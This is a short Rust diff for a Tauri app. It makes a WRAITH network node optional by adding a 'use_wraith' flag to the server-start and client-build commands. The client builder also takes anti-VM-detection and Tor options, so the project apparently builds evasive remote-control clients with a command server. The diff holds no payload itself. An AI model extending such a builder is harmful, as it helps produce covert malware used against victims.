@@ -85,6 +85,7 @@ pub async fn send_server_command(
 #[tauri::command]
 pub async fn start_server(
     port: &str,
+    use_wraith: bool,
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle,
 ) -> Result<String, String> {
@@ -123,18 +124,20 @@ pub async fn start_server(
 
     let port = port.parse::<u16>().unwrap();
 
-    // Start WRAITH node
-    let wraith_port = port + 1; // Use port+1 for WRAITH
-    let wraith_node = wraith_core::Node::new_random_with_port(wraith_port).await.map_err(|e| e.to_string())?;
-    wraith_node.start().await.map_err(|e| e.to_string())?;
+    // Start WRAITH node (only when enabled)
+    if use_wraith {
+        let wraith_port = port + 1; // Use port+1 for WRAITH
+        let wraith_node = wraith_core::Node::new_random_with_port(wraith_port).await.map_err(|e| e.to_string())?;
+        wraith_node.start().await.map_err(|e| e.to_string())?;
 
-    ctx.send(ServerCommand::SetWraithNode(wraith_node.clone()))
-        .await
-        .map_err(|e| format!("Failed to set WRAITH node: {}", e))?;
+        ctx.send(ServerCommand::SetWraithNode(wraith_node.clone()))
+            .await
+            .map_err(|e| format!("Failed to set WRAITH node: {}", e))?;
 
-    {
-        let mut tauri_state = tauri_state.0.lock().unwrap();
-        tauri_state.wraith_node = Some(wraith_node.clone());
+        {
+            let mut tauri_state = tauri_state.0.lock().unwrap();
+            tauri_state.wraith_node = Some(wraith_node.clone());
+        }
     }
 
     let listener_task = tokio::spawn(async move {
@@ -237,6 +240,7 @@ pub async fn build_client(
     anti_vm_detection: bool,
     use_tor: bool,
     tor_address: &str,
+    use_wraith: bool,
     app_handle: AppHandle,
 ) -> Result<String, String> {
     let log = Log {
@@ -261,6 +265,7 @@ pub async fn build_client(
         anti_vm_detection,
         use_tor,
         tor_address: tor_address.to_string(),
+        use_wraith,
     };
 
     apply_config(&config).await?;
